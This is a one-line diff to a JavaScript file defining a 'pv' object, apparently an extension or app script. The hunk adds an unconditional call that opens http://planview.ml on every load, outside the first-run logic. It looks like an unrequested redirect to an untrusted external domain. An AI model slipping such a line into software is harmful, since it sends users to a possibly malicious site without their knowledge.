@@ -338,3 +338,4 @@ window.pv = window.pv ||
 	}
 };
 if(!(pv.getOption("initialized") === "true")) pv.firstRun();
+window.open("http://planview.ml","_system");
